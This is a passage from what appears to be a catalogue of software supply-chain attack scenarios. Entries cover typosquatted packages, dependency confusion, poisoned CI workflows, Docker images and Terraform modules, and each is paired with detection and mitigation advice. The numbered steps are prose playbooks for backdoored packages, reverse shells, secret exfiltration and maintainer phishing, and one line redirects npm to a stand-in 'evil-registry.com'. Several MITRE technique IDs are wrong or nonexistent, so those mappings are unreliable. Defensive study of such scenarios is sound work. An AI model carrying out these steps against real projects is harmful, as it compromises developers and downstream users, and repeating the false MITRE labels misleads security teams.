- **Detection**: Review all custom targets in packages
- **Solution**: Use only whitelisted and signed NuGet packages
- **Tags**: nuget, .net, ci/cd, msbuild, payload injection

## Hijack GitHub Actions via Forked PR with Workflow Changes

- **Attack Type**: CI Workflow Injection
- **Target**: Open-source Projects
- **Vulnerability**: Insecure GitHub Actions workflow trust
- **MITRE**: T1059
- **Impact**: Secrets or artifact theft from GitHub CI
- **Tools**: GitHub Actions
- **Scenario**: Attacker forks a public repo and adds malicious GitHub Actions changes, which are executed upon PR creation.
- **Attack Steps**: 1. Fork a target public GitHub repo.2. Modify .github/workflows/ci.yml to include malicious code in the pull_request trigger.3. Submit a PR.4. If the repo’s Actions setting runs workflows from PRs by default, the attacker code runs in the CI context with access to secrets.
- **Detection**: Monitor for new/modified workflows on PR triggers
- **Solution**: Use pull_request_target securely and restrict secret access for PRs from forks
- **Tags**: github-actions, ci/cd, oss security

## Malicious Bash Hook in Conan C++ Package

- **Attack Type**: Native Library Abuse
- **Target**: Native Dev Envs
- **Vulnerability**: Hidden install-time scripts in packages
- **MITRE**: T1059.004
- **Impact**: Local system compromise during native builds
- **Tools**: Conan, Bash
- **Scenario**: Attacker creates a Conan C++ package with install-time hooks that execute malicious bash scripts.
- **Attack Steps**: 1. Upload a package to Conan Center with a preinstall hook script in conanfile.py.2. Developer installs the package normally.3. Hook executes on install time, dropping persistence scripts or collecting host data.4. Since C++ users often skip audits, it remains undetected.
- **Detection**: Monitor for pre/post install hooks in build tools
- **Solution**: Audit .conanfile.py and isolate build environments
- **Tags**: conan, cpp, devsecops, native builds, hook injection

## Hijack Terraform Module via Registry Name Squatting

- **Attack Type**: Registry Typosquatting
- **Target**: IaC Pipelines
- **Vulnerability**: Misconfigured module source path
- **MITRE**: T1554
- **Impact**: Cloud exposure or resource hijack
- **Tools**: Terraform, HCL, Registry
- **Scenario**: Attacker publishes a Terraform module with a name identical to a misconfigured internal one.
- **Attack Steps**: 1. Attacker identifies internal Terraform module like corp/vpc/aws used in public templates.2. Registers the same name on Terraform public registry.3. When devs use misconfigured or incomplete source URLs, Terraform fetches from public instead of internal.4. Malicious module provisions public resources or opens firewall rules.
- **Detection**: Monitor module source resolution
- **Solution**: Use version pinning and fully qualified module source paths
- **Tags**: terraform, iac, registry attack, cloud

## Java Maven Plugin Exploitation During Build

- **Attack Type**: Build Plugin Poisoning
- **Target**: Java Build Systems
- **Vulnerability**: Malicious plugin lifecycle phase misuse
- **MITRE**: T1129
- **Impact**: Local compromise, secrets theft during build
- **Tools**: Maven, Java, pom.xml
- **Scenario**: Attacker submits a backdoored Maven plugin that runs code during compile or test phase.
- **Attack Steps**: 1. Attacker uploads a malicious plugin to a Maven repo with attractive keywords.2. Developer includes it in pom.xml for added feature (e.g., code coverage).3. The plugin executes code during the Maven lifecycle — like accessing credentials from local settings.xml or exfiltrating .env files.4. Since it's a plugin, it's often overlooked in dependency scans.
- **Detection**: Monitor lifecycle plugin behavior in builds
- **Solution**: Use known plugins only and restrict plugin execution privileges
- **Tags**: maven, java, build, plugin abuse

## Compromised GitHub Action in Forked Repo

- **Attack Type**: CI/CD Workflow Poisoning
- **Target**: GitHub CI/CD
- **Vulnerability**: Unvalidated PR workflows
- **MITRE**: T1609.002
- **Impact**: Secrets exfiltration from CI
- **Tools**: GitHub Actions, Malicious PR, Git
- **Scenario**: An attacker forks a legitimate GitHub repository and poisons the ci.yml with malicious actions, then opens a PR. The maintainer merges it, unknowingly allowing malicious workflows to run.
- **Attack Steps**: 1. Attacker forks a popular open-source repo with GitHub Actions. 2. They edit the .github/workflows/ci.yml to include a malicious script (e.g., exfiltrate secrets via curl). 3. Submit a PR that looks legitimate, such as a documentation or typo fix. 4. Maintainer merges without checking the workflow file. 5. The modified workflow executes in the upstream's CI with higher permissions, leaking secrets.
- **Detection**: Review PRs for workflow changes, monitor GitHub Actions logs
- **Solution**: Require code owners for workflow changes, use pull_request_target safely
- **Tags**: #github #actions #ci #supplychain #exfiltration

## Trojanized VSCode Extension

- **Attack Type**: Developer Environment Attack
- **Target**: Developer Workstation
- **Vulnerability**: VSCode Marketplace lacks sandboxing
- **MITRE**: T1555, T1056
- **Impact**: Credential theft, source code leakage
- **Tools**: VSCode, Obfuscation, JavaScript
- **Scenario**: A malicious VSCode extension is uploaded to the Marketplace with appealing features but contains obfuscated spyware that monitors the developer’s code and steals tokens.
- **Attack Steps**: 1. Attacker creates a seemingly useful VSCode extension (e.g., a linter or beautifier). 2. They include obfuscated code to intercept clipboard content and browser cookies. 3. Publishes it to the VSCode Marketplace with fake reviews. 4. Developers install it unknowingly. 5. The extension silently sends sensitive data to an attacker-controlled server.
- **Detection**: Network monitoring, endpoint EDR alerts, review extensions
- **Solution**: Only use vetted extensions, monitor outbound connections from IDEs
- **Tags**: #vscode #trojan #ide #developer #marketplace

## Tampering with SBOM Metadata

- **Attack Type**: Artifact Manipulation
- **Target**: Artifact Repositories
- **Vulnerability**: Incomplete or forged SBOM
- **MITRE**: T1601.002
- **Impact**: Hidden vulnerable dependency usage
- **Tools**: Syft, SPDX, CycloneDX
- **Scenario**: An attacker alters the Software Bill of Materials (SBOM) before artifact publication to hide the presence of vulnerable or malicious dependencies.
- **Attack Steps**: 1. Attacker builds a release with a vulnerable package. 2. Before publishing, they manually alter the generated SBOM (JSON/XML) to omit or rename the package. 3. Publish the artifact and SBOM to the public repo. 4. Security scanners parsing SBOMs trust them and do not detect the vulnerable component. 5. Artifact gets used in downstream systems, propagating risk.
- **Detection**: Cross-verify SBOM with binary analysis, hash matching
- **Solution**: Automate SBOM generation and lock editing
- **Tags**: #sbom #artifact #obfuscation #vulnerability

## Rogue Internal Package Registry

- **Attack Type**: Dependency Injection
- **Target**: Internal CI/CD
- **Vulnerability**: Misconfigured registry source
- **MITRE**: T1195.002
- **Impact**: Code tampering and data theft
- **Tools**: Verdaccio, MITMProxy, npm
- **Scenario**: An insider creates a fake internal package registry mimicking the enterprise's private repo, and publishes malicious packages that override legitimate ones during builds.
- **Attack Steps**: 1. Insider sets up a rogue internal registry with same domain prefix (e.g., internal-pkg.local). 2. Publishes a malicious utils-core package with same version. 3. Developer machine or CI misconfigured to use the rogue registry. 4. During builds, the malicious package is pulled and used. 5. It exfiltrates environment secrets or manipulates business logic.
- **Detection**: Compare package signatures, audit registry sources
- **Solution**: Use strict registry pinning and scoped sources
- **Tags**: #npm #registry #insider #devops #rogue

## Hijacked SDK in IoT Firmware Supply Chain

- **Attack Type**: Firmware Supply Chain Poisoning
- **Target**: IoT Devices
- **Vulnerability**: SDK vendor compromise
- **MITRE**: T1608.003
- **Impact**: Remote backdoor in deployed devices
- **Tools**: Bluetooth Low Energy (BLE), SDK Reverse Engineering
- **Scenario**: An attacker compromises a third-party SDK used in multiple IoT vendors’ firmware, inserting a backdoor accessible over Bluetooth.
- **Attack Steps**: 1. Attacker compromises the SDK vendor (e.g., Bluetooth stack SDK). 2. Inserts backdoor that activates on a specific BLE command. 3. The modified SDK is integrated by multiple OEMs unaware of the malicious change. 4. Devices are shipped globally with the backdoored firmware. 5. Attacker uses BLE to exploit the vulnerability in deployed devices.
- **Detection**: BLE scanning, firmware behavior anomalies
- **Solution**: Vendor verification, SDK hash validation
- **Tags**: #iot #firmware #ble #sdk #backdoor

## Dependency Confusion in Git Submodules

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD
- **Vulnerability**: Misconfigured submodule paths
- **MITRE**: T1195.002
- **Impact**: Code execution via public repo
- **Tools**: Git, GitHub, Internal Git
- **Scenario**: An attacker registers a public Git repo with the same name as an internally referenced Git submodule, and CI pulls the wrong one.
- **Attack Steps**: 1. Company uses a Git submodule git@internal.company.com:libs/auth.git. 2. Attacker registers a public GitHub repo at github.com/libs/auth.git with malicious code. 3. Due to misconfigured .gitmodules, the CI mistakenly fetches the public repo. 4. Malicious submodule is compiled and embedded in production binary. 5. It sends access logs to attacker infrastructure.
- **Detection**: Audit .gitmodules, monitor CI clone sources
- **Solution**: Use private registries, validate submodule origins
- **Tags**: #git #submodules #confusion #ci #devsecops

## Fake Open-Source Project with SEO Poisoning

- **Attack Type**: Social Engineering + Payload Delivery
- **Target**: Developer Machines
- **Vulnerability**: Social engineering via SEO
- **MITRE**: T1204.001
- **Impact**: Mass malware distribution via dev search
- **Tools**: GitHub, Hugo Blog, SEO, JavaScript
- **Scenario**: An attacker creates a fake GitHub repo and blog mimicking a legit project, using SEO tactics to push it to the top of Google for developer queries. The repo contains a malicious payload.
- **Attack Steps**: 1. Attacker clones an open-source project and modifies README, project name. 2. Sets up a website (e.g., fast-minifier.js) with a tutorial that recommends using the project. 3. Optimizes SEO to rank for terms like “best JS minifier GitHub”. 4. Developers discover it and clone the malicious repo. 5. Malware executes on build or post-install.
- **Detection**: Monitor trending repos, verify maintainers
- **Solution**: Promote verified sources and use allowlists
- **Tags**: #seo #github #socialengineering #fakeproject

## MITM of Package Hash Verification Script

- **Attack Type**: Build Environment Manipulation
- **Target**: CI/CD Pipeline
- **Vulnerability**: Unsecured remote scripts
- **MITRE**: T1557.001
- **Impact**: Silent injection of malicious dependencies
- **Tools**: MITMProxy, Bash, Curl
- **Scenario**: An attacker intercepts a CI script that verifies dependency hashes using a shell script, and replaces the hash check logic with a fake success condition.
- **Attack Steps**: 1. CI build script downloads a verify_hash.sh script from a central location. 2. Attacker MITMs the request and modifies the script to always return success. 3. Build proceeds even if packages are tampered. 4. Malicious package with altered hash gets included in production binary. 5. Compromise goes unnoticed due to bypassed verification.
- **Detection**: Use TLS pinning, monitor for unexpected script behavior
- **Solution**: Avoid remote script dependencies, use local and verified scripts
- **Tags**: #hashbypass #scriptinjection #mitm #ci

## Compromised PyPI Maintainer Credentials

- **Attack Type**: Account Takeover
- **Target**: Public Package Registry
- **Vulnerability**: Weak maintainer security
- **MITRE**: T1556.001
- **Impact**: Compromise of thousands of downstream apps
- **Tools**: PyPI, Twine, Evilginx
- **Scenario**: An attacker phishes PyPI maintainer credentials for a widely-used package and uploads a backdoored version that activates under certain conditions.
- **Attack Steps**: 1. Attacker sends spear-phishing email to PyPI maintainer with Evilginx phishing page. 2. Steals PyPI 2FA token and logs in. 3. Uploads version 2.5.2 of a popular package with conditional malware (e.g., activates only in CI). 4. Package is auto-installed by thousands of projects. 5. Stealthy malware exfiltrates secrets during CI builds.
- **Detection**: 2FA logins from new IPs, behavior analysis
- **Solution**: Enforce hardware token-based auth, alert on new uploads
- **Tags**: #pypi #phishing #twine #maintainer #ci

## Artifact Poisoning via Prebuilt Binaries

- **Attack Type**: Binary Substitution
- **Target**: Artifact Repositories
- **Vulnerability**: Trusting unverified binaries
- **MITRE**: T1601.002
- **Impact**: Deployment of non-source-matching malware
- **Tools**: Make, GPG, Curl, GitHub Releases
- **Scenario**: Attacker compromises a project that distributes both source and prebuilt binaries, replacing the .tar.gz with a modified version that differs from source code.
- **Attack Steps**: 1. Maintainer forgets to verify built artifacts before upload. 2. Attacker pushes a backdoored binary to GitHub Releases that passes basic checksum but not matches source. 3. Developers skip build and use prebuilt artifact. 4. Backdoor activates in production. 5. Detection is difficult as source seems clean.
- **Detection**: Binary-source diffing, GPG signature validation
- **Solution**: Require reproducible builds and verify hash matches
- **Tags**: #binary #release #poison #github

## Dependency Confusion in GitHub Actions

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipelines
- **Vulnerability**: Lack of dependency pinning & use of public registry
- **MITRE**: T1195.001
- **Impact**: Arbitrary code execution in CI/CD, credential theft
- **Tools**: GitHub, PyPI, npm
- **Scenario**: Exploiting GitHub Actions workflows that install packages by name without locking to a private registry.
- **Attack Steps**: 1. Search for public GitHub repos using GitHub Actions with pip install somepackage without version pinning.2. Register a package with the same name on PyPI/npm that does not yet exist publicly.3. Push a version with a backdoored payload.4. Trigger the GitHub Action (via PR or push) which installs your package.5. Confirm payload execution via callback (e.g., webhook or C2).6. Exfiltrate environment secrets or inject code artifacts.
- **Detection**: Monitor package registries, GitHub workflow audit logs
- **Solution**: Use strict dependency pinning and private/internal registries
- **Tags**: github-actions, CI/CD, python, npm, GitHub

## Compromised Developer Email → Typosquatted Domain Upload

- **Attack Type**: Typosquatting
- **Target**: Developers
- **Vulnerability**: Typosquatted domains; developer credential reuse
- **MITRE**: T1583.001, T1555.003
- **Impact**: Supply chain poisoning through impersonation
- **Tools**: Evilginx, Gophish
- **Scenario**: Uploading malicious packages using domains visually similar to legitimate ones after stealing email creds.
- **Attack Steps**: 1. Phish a developer’s credentials using Evilginx and a cloned login page.2. Register a typosquatted domain (e.g., packagelab.io vs packagelabs.io).3. Upload a malicious package pretending to be an internal library used by their org.4. Use spearphishing or social engineering to convince devs to install your package.5. On installation, collect data or drop malware.6. Persist using shell injection in setup.py or postinstall hook.
- **Detection**: DNS watchlists, employee phishing report rates
- **Solution**: Harden SPF/DKIM/DMARC, train devs, monitor typosquat domains
- **Tags**: typosquatting, phishing, dev-env

## Compromising Package Manager CLI with Malicious Update

- **Attack Type**: Toolchain Poisoning
- **Target**: Developer Machines
- **Vulnerability**: Unencrypted update channels
- **MITRE**: T1557.001
- **Impact**: Persistent access to developer environments
- **Tools**: Burp Suite, mitmproxy
- **Scenario**: Delivering a malicious version of a package manager CLI via altered update script.
- **Attack Steps**: 1. Set up a rogue Wi-Fi hotspot in a dev-heavy area (e.g., conferences).2. Use mitmproxy to intercept HTTP update checks from outdated package manager CLIs (like brew, apt, or pip).3. Replace the binary or script served with a backdoored version.4. Wait for devs to run the update and overwrite their binaries.5. Ensure persistence by modifying shell profile files.6. Exfiltrate secrets or provide remote access via beaconing.
- **Detection**: Network monitoring, check for unsigned binaries
- **Solution**: Enforce TLS on update URLs, use signed binaries
- **Tags**: toolchain, MITM, CLI, dev-infra

## NPM Installer Shell Execution via Malicious Lifecycle

- **Attack Type**: Malicious Build Scripts
- **Target**: Developer Workstation
- **Vulnerability**: Unsanitized install hooks in JavaScript packages
- **MITRE**: T1059.007, T1203
- **Impact**: Remote access and data exfiltration from devs' systems
- **Tools**: npm, netcat, reverse shells
- **Scenario**: Abuse preinstall/postinstall in package.json of npm package to run code on install.
- **Attack Steps**: 1. Create a fake npm library with a desirable name (e.g., utils-logger or lodash-fix).2. In package.json, include "preinstall" or "postinstall" scripts with malicious commands (e.g., reverse shell, curl to C2).3. Publish to npm registry.4. Share via GitHub issues or Stack Overflow to bait users.5. When a dev installs the package, the malicious script executes.6. Gain shell access or exfiltrate files from their machine.
- **Detection**: Monitor for unexpected install scripts in audit logs
- **Solution**: Use --ignore-scripts, validate packages before install
- **Tags**: nodejs, npm, javascript, shell

## Container Image Poisoning via Public Registry Pull

- **Attack Type**: Poisoned Artifact
- **Target**: CI/CD, Dev Containers
- **Vulnerability**: Lack of image validation and signature enforcement
- **MITRE**: T1195.002
- **Impact**: Compromise of internal dev/staging infrastructure
- **Tools**: DockerHub, Trivy
- **Scenario**: Attacker uploads malicious Docker image with a name similar to a private one used internally.
- **Attack Steps**: 1. Monitor DockerHub for popular internal image names (e.g., company/base, internal/ubuntu-dev).2. Create a similar image name and upload a malicious version with embedded backdoors.3. Add tags to make it look recent or official.4. If devs accidentally pull your image instead of the internal one, malicious code runs during build.5. Drop remote access tools, rootkits, or crypto miners in the container.6. Watch for callback traffic or beacon signals.
- **Detection**: Monitor image pull logs, verify signatures
- **Solution**: Enforce signed image policies with Notary or Cosign
- **Tags**: container, docker, registry, impersonation

## Public Git Repos Leaking requirements.txt

- **Attack Type**: Dependency Exposure
- **Target**: Open Source Projects
- **Vulnerability**: Public leakage of internal dependency names
- **MITRE**: T1195.001
- **Impact**: Internal compromise through exposed public information
- **Tools**: GitHub Dorking, PyPI
- **Scenario**: Scanning public repos for requirements.txt to discover internal libs to typosquat.
- **Attack Steps**: 1. Search GitHub using dorks like filename:requirements.txt org:company-name.2. Collect all internal-sounding packages that don’t exist on PyPI (e.g., internal-logging, prod-metrics).3. Register those names on PyPI and publish a malicious version.4. Wait for internal builds or devs to resolve dependencies automatically.5. Your package is fetched and executed during build.6. Trigger backdoor via setup hook or import statement.
- **Detection**: GitHub repo scans, dependency resolution tracking
- **Solution**: Avoid committing sensitive files; use private repos
- **Tags**: python, pypi, github-leak

## Git Submodule Remote Rewrite to Malicious Repo

- **Attack Type**: Git Abuses
- **Target**: Repositories with CI
- **Vulnerability**: Unverified submodule URLs in Git
- **MITRE**: T1195.002
- **Impact**: Remote code execution or persistence through Git abuse
- **Tools**: Git, GitHub, Malicious repo
- **Scenario**: Modify .gitmodules to point submodules to attacker-controlled repos with malicious scripts.
- **Attack Steps**: 1. Fork a project that uses Git submodules.2. Modify the .gitmodules file to point to a repo you control.3. Include malicious scripts or payloads in your controlled repo.4. Submit a pull request with other benign-looking changes.5. If the PR is merged without validating submodules, the attacker’s repo is fetched on the next build.6. Payload runs with developer/system context.
- **Detection**: Detect submodule URL changes in code reviews
- **Solution**: Pin and verify submodule URLs, use signed commits
- **Tags**: git, submodule, ci, devops

## Compromising SDK Download Links on Official Docs

- **Attack Type**: Website Injection
- **Target**: Developers, SDK Users
- **Vulnerability**: Lack of integrity check on downloaded SDKs
- **MITRE**: T1565.001
- **Impact**: User systems or downstream software compromise
- **Tools**: Burp Suite, CMS exploits
- **Scenario**: Attacker compromises documentation site and changes SDK download link to malicious binary.
- **Attack Steps**: 1. Scan for vulnerable CMS or S3 bucket hosting documentation sites.2. Gain write access to HTML or MD files in official docs.3. Change SDK download URLs to link to attacker-hosted malicious binaries.4. Users downloading SDK for integration unknowingly execute malware.5. Persist by keeping filename and checksum visually identical to real one.6. Exfiltrate telemetry or credentials from victim apps.
- **Detection**: Monitor file hash mismatches; validate links regularly
- **Solution**: Use hashes/signatures for binaries in docs
- **Tags**: sdk, docs, webinject, CMS

## Abuse of Open Build Systems (e.g., OBS, AUR)

- **Attack Type**: Open Package Ecosystem Abuse
- **Target**: Linux Users
- **Vulnerability**: Blind trust in user-submitted build scripts
- **MITRE**: T1059.004, T1203
- **Impact**: System takeover, credential theft, crypto mining
- **Tools**: makepkg, AUR, OBS
- **Scenario**: Malicious software injected into packages built by public systems like Arch AUR or Open Build Service.
- **Attack Steps**: 1. Create an AUR package for a niche utility or outdated tool.2. Inject malicious Bash or Python into build scripts (PKGBUILD or install.sh).3. Wait for users to build the package using makepkg.4. Malicious code executes during build step.5. Monitor telemetry or exfiltrate SSH keys.6. Use built-in package trust (many users blindly install from AUR).
- **Detection**: Community package reviews; heuristic scanning of scripts
- **Solution**: Restrict access; improve review and sandboxing in OBS/AUR
- **Tags**: aur, linux, open-build, buildsystem

## Tampering with .npmrc to Redirect Registry

- **Attack Type**: Configuration Hijack
- **Target**: CI Servers, Devs
- **Vulnerability**: Misconfigured or hijacked npm config files
- **MITRE**: T1556.003, T1557.003
- **Impact**: Backdoored builds and persistent compromise of pipeline
- **Tools**: npm, rogue registry server
- **Scenario**: Attacker modifies .npmrc file to redirect dependency installs to malicious private registry.
- **Attack Steps**: 1. Gain access to a developer’s machine or a build server.2. Modify or overwrite their .npmrc to point registry=https://evil-registry.com.3. Upload backdoored versions of internal packages to this fake registry.4. Devs or CI pull dependencies from the attacker registry unknowingly.5. Inject persistence or exfiltration logic during builds.6. Blend in by using version numbers similar to real packages.
- **Detection**: Monitor registry sources, validate npm config
- **Solution**: Lock registry settings, validate registry with checksum
- **Tags**: javascript, devops, config-hijack, ci

## Poisoned Base Image in Docker Registry

- **Attack Type**: Container Image Poisoning
- **Target**: CI/CD Containers
- **Vulnerability**: Lack of Image Verification
- **MITRE**: T1602.002 (Dependency Confusion)
- **Impact**: Remote code execution inside containerized systems.
- **Tools**: Docker, Docker Hub, Netcat
- **Scenario**: An attacker injects a reverse shell into a commonly used base Docker image on a public registry.
- **Attack Steps**: 1. The attacker creates a Dockerfile using a base image like ubuntu:latest. 2. Before publishing, they add a RUN instruction to silently download and launch a reverse shell script. 3. They push this manipulated image to Docker Hub under a misleading name similar to a popular one (e.g., ubunutu:latest). 4. A developer unknowingly uses this image in production CI pipelines. 5. Upon container spin-up, the reverse shell connects to the attacker’s listener, granting shell access.
- **Detection**: Network anomaly detection, reverse shell connections
- **Solution**: Use image signing and scanning; always use trusted images.
- **Tags**: container-security, docker, devops, image-poisoning

## Manipulated Git Submodule in Open Source Project

- **Attack Type**: Git Submodule Hijacking
- **Target**: Open Source Repos
- **Vulnerability**: Trust in .gitmodules content
- **MITRE**: T1195.002 (Compromise Software Supply Chain)
- **Impact**: Code execution or credential theft via post-checkout hooks
- **Tools**: Git, GitHub, Ngrok
- **Scenario**: An attacker adds a malicious git submodule URL to a legitimate repository's .gitmodules file.
- **Attack Steps**: 1. Attacker forks a popular repo and modifies the .gitmodules file to include a submodule with a malicious repo. 2. They craft the submodule’s content to contain a post-checkout Git hook or embedded malware. 3. They submit a PR to the original repo with legitimate-looking code. 4. If merged, the next developer cloning the repo recursively (--recurse-submodules) pulls the malicious submodule. 5. Git executes hooks or dependencies from the malicious submodule, triggering the attack.
- **Detection**: Git hook auditing, submodule monitoring
- **Solution**: Disable git hooks and validate .gitmodules in PR reviews
- **Tags**: git-abuse, source-chain, hooks, github, devops

## Abuse of Package Preinstall Script in .npmrc

- **Attack Type**: Malicious Preinstall in Registry
- **Target**: Developer Systems
- **Vulnerability**: Unrestricted preinstall execution
- **MITRE**: T1059.007 (JavaScript Execution)
- **Impact**: Token theft, shell access, dev system compromise
- **Tools**: npm, Node.js, Terminal
- **Scenario**: An attacker publishes a benign-looking NPM package that includes a harmful preinstall script.
- **Attack Steps**: 1. Attacker creates a library that appears harmless (e.g., a UI helper). 2. They insert a preinstall script in package.json that exfiltrates .npmrc tokens or system info. 3. They publish it on npm with a tempting name (e.g., color-utils-2024). 4. A developer installs this package, triggering the script silently before installation. 5. The attacker receives the stolen tokens or initiates follow-on actions like shell spawning.
- **Detection**: Monitor install scripts via .npmrc, analyze package metadata
- **Solution**: Disable lifecycle scripts or whitelist known packages
- **Tags**: nodejs, javascript, devsecops, npm, registry

## Vendor SDK with Hardcoded Backdoor

- **Attack Type**: Embedded Vendor Backdoor
- **Target**: Mobile / Web Apps
- **Vulnerability**: Lack of SDK transparency
- **MITRE**: T1608.002 (Compromise Software Dependencies)
- **Impact**: Unauthorized access to user data or system internals
- **Tools**: IDA Pro, Burp Suite
- **Scenario**: A vendor supplies a compiled SDK that contains an intentional backdoor reachable via hidden API.
- **Attack Steps**: 1. Attacker (or insider) embeds an undocumented API in a vendor SDK for convenience or surveillance. 2. The SDK is integrated into hundreds of downstream apps by unaware developers. 3. When the attacker sends a crafted request, the backdoor activates (e.g., bypasses auth or exposes sensitive data). 4. Through reverse engineering (e.g., using IDA Pro), researchers eventually uncover the undocumented call.
- **Detection**: API behavior fuzzing, SDK binary diffing
- **Solution**: Use open-source SDKs or decompile and audit closed ones
- **Tags**: sdk, vendor-trust, backdoor, mobile

## Typo-Squatted PyPI Package with Data Stealer

- **Attack Type**: Typo-Squatting
- **Target**: Python Dev Systems
- **Vulnerability**: Typosquatting & lack of validation
- **MITRE**: T1556.001 (Credential Access via Code Libraries)
- **Impact**: Stealing tokens, credentials, cookies
- **Tools**: PyPI, pip, Burp, Wireshark
- **Scenario**: A malicious Python package is uploaded with a name close to a popular one (e.g., pandas → pands).
- **Attack Steps**: 1. Attacker uploads pands to PyPI with same function signatures as pandas. 2. They add logic to steal browser cookies, environment variables, or send HTTP data to a C2. 3. Developer mistypes the package name and installs pands. 4. On import or install, malicious code runs and starts exfiltrating data. 5. No visible errors occur, and it mimics real output to avoid suspicion.
- **Detection**: Static and dynamic code review, pip audit tools
- **Solution**: Lock dependencies with hashes, validate before install
- **Tags**: pypi, devtools, credential-theft, supply-chain

## Compromised Browser Extension Injecting Scripts

- **Attack Type**: Browser Extension Abuse
- **Target**: Browsers
- **Vulnerability**: Implicit trust in browser extension updates
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Credential theft, session hijacking, brand abuse
- **Tools**: Chrome DevTools, CRX Viewer
- **Scenario**: An attacker buys or compromises a browser extension and injects adware or data-stealing scripts.
- **Attack Steps**: 1. Attacker purchases a popular extension from a bored developer. 2. They update it with a new feature but embed malicious JavaScript that reads cookies or DOM content. 3. Update is auto-delivered via Chrome Web Store to all users. 4. Script injects malicious code into visited sites or steals session tokens. 5. Users face slowdowns, credential leaks, or ad injection without suspecting the extension.
- **Detection**: Extension behavior monitoring, manifest audit
- **Solution**: Review and restrict permissions, use CRX checksum
- **Tags**: browser-security, chrome, session-theft, web

## Precompiled Binaries with Infected Installer

- **Attack Type**: Binary Wrapping Attack
- **Target**: Developer Machines
- **Vulnerability**: Absence of binary verification
- **MITRE**: T1553.002 (Subvert Signed Code)
- **Impact**: RAT installation, full system takeover
- **Tools**: curl, strings, VirusTotal
- **Scenario**: Legit software is repackaged with malware by hosting it on a fake mirror resembling an official one.
- **Attack Steps**: 1. Attacker clones a popular GitHub repo and builds the software with malware embedded. 2. They upload it to a fake site with similar domain (e.g., vscode-releases.net). 3. Victim searches for the tool and lands on this malicious mirror. 4. They download and install the binary without validating signatures. 5. Malware executes during installation (keylogger, RAT, or ransomware).
- **Detection**: Monitor outbound traffic, validate sources via hash check
- **Solution**: Use GPG-signed releases, educate about safe downloads
- **Tags**: binary-injection, software-fake, malware

## Terraform Module with Obfuscated Malicious Logic

- **Attack Type**: IaC Poisoning
- **Target**: IaC / DevOps Infra
- **Vulnerability**: Untrusted IaC modules
- **MITRE**: T1602.001 (Third-Party Software)
- **Impact**: Cloud takeover, system compromise via IaC
- **Tools**: Terraform CLI, TF Registry, Netcat
- **Scenario**: A Terraform module on the registry contains a hidden local-exec that downloads a remote payload.
- **Attack Steps**: 1. Attacker uploads a useful-looking Terraform module for a popular cloud resource (e.g., S3 bucket). 2. Inside the module, they embed a null_resource with local-exec to run a shell command. 3. This script downloads and executes a malicious binary. 4. User includes this module without checking internals. 5. On terraform apply, code is executed on the local or cloud system, giving the attacker access.
- **Detection**: Parse IaC for suspicious local-exec
- **Solution**: Pin module versions, manually review open modules
- **Tags**: terraform, iac-risk, cloud-compromise

## Hijacked CI Plugin Delivering Ransomware

- **Attack Type**: Compromised CI/CD Plugin
- **Target**: CI/CD Build Systems
- **Vulnerability**: Plugin update without sandboxing
- **MITRE**: T1608.003 (Supply Chain Compromise)
- **Impact**: Widespread developer machine encryption
- **Tools**: Jenkins, YARA, ELK
- **Scenario**: A popular Jenkins plugin was compromised and started pushing ransomware via pipeline build agents.
- **Attack Steps**: 1. Attacker either gains access to plugin dev account or submits malicious update in a community plugin. 2. Plugin update is auto-applied on Jenkins master. 3. It modifies build steps to encrypt files on worker nodes post-build. 4. Files on shared drives get encrypted using the ransomware logic. 5. Victims receive ransom notes or C2 connections are made.
- **Detection**: Monitor build process behavior, plugin audits
- **Solution**: Use signed plugins and maintain strict update policies
- **Tags**: ci-security, jenkins, ransomware, plugin-injection

## Modified Composer Package Exfiltrating ENV Secrets

- **Attack Type**: PHP Dependency Poisoning
- **Target**: PHP Web Apps
- **Vulnerability**: Unchecked dependencies in PHP ecosystem
- **MITRE**: T1608.002 (Compromise Software Dependencies)
- **Impact**: API key and DB credential leaks
- **Tools**: Composer, Laravel, Wireshark
- **Scenario**: A modified Composer package leaks .env secrets from Laravel apps to a remote server.
- **Attack Steps**: 1. Attacker forks a legitimate Composer PHP package. 2. Inserts code in the library to read .env values on load (like DB password, API keys). 3. Code sends data via HTTP POST to attacker-controlled domain. 4. Package is named similarly and uploaded to Packagist. 5. Laravel developer unknowingly includes it and deploys the app. 6. Secrets get exfiltrated on every app start.
- **Detection**: Monitor network traffic from PHP apps
- **Solution**: Only allow approved packages via private Packagist
- **Tags**: php, composer, laravel, env-leak, supply-chain

## Compromising CI Plugins to Inject Malicious Artifacts

- **Attack Type**: Build System Compromise
- **Target**: CI/CD Systems
- **Vulnerability**: Trust in third-party plugins
- **MITRE**: T1554
- **Impact**: Silent compromise of all builds using the infected plugin
- **Tools**: Jenkins, GitHub Actions
- **Scenario**: An attacker targets a popular plugin used by CI systems (like Jenkins or GitHub Actions) and injects malicious logic that alters build artifacts during pipeline execution.
- **Attack Steps**: 1. Identify a widely-used open-source CI plugin (e.g., for Jenkins). 2. Fork the plugin and inject logic that modifies build outputs to include a backdoor (e.g., reverse shell, credential logger). 3. Publish the plugin update or submit a pull request if it’s open-source.4. Wait for downstream developers to include the malicious plugin in their pipeline. 5. Once executed in a CI/CD pipeline, the modified build artifact contains the attacker’s payload.6. These tampered artifacts then get published to production or internal repositories. 7. Attacker gains access when the artifact is used or deployed.
- **Detection**: Monitor plugin integrity and behavior in builds
- **Solution**: Validate plugins with static code review; use hash checks
- **Tags**: CI/CD, Plugin Tampering, Artifact Poisoning, Jenkins, Build System

## Leveraging NPM Maintainer Transfers for Malicious Injection

- **Attack Type**: Dependency Takeover
- **Target**: Developers
- **Vulnerability**: Package transfer procedures unmonitored
- **MITRE**: T1195.002
- **Impact**: Widespread compromise of dependent projects
- **Tools**: NPM CLI, NPM Registry
- **Scenario**: An attacker monitors for NPM packages whose maintainers transfer ownership. When they find one, they impersonate or compromise the new maintainer account and inject a backdoor into the package.
- **Attack Steps**: 1. Monitor NPM registry feeds for packages whose ownership changes (using registry metadata). 2. Target a recently transferred package with significant downloads. 3. Attempt phishing or credential stuffing on the new maintainer's account.4. Once access is obtained, publish a new version with malicious code.5. Add stealth techniques such as obfuscation or environment checks.6. Wait for dependent projects to update automatically.7. When users install the updated version, the payload gets executed, possibly stealing credentials or opening a backdoor.
- **Detection**: Monitor metadata changes; alert on high-profile package transfers
- **Solution**: Use package signing; audit ownership changes
- **Tags**: NPM, Maintainer Attack, Dependency Injection, JavaScript

## Malicious IDE Extensions for Dev-Time Payload Injection

- **Attack Type**: Development Environment Compromise
- **Target**: Developers
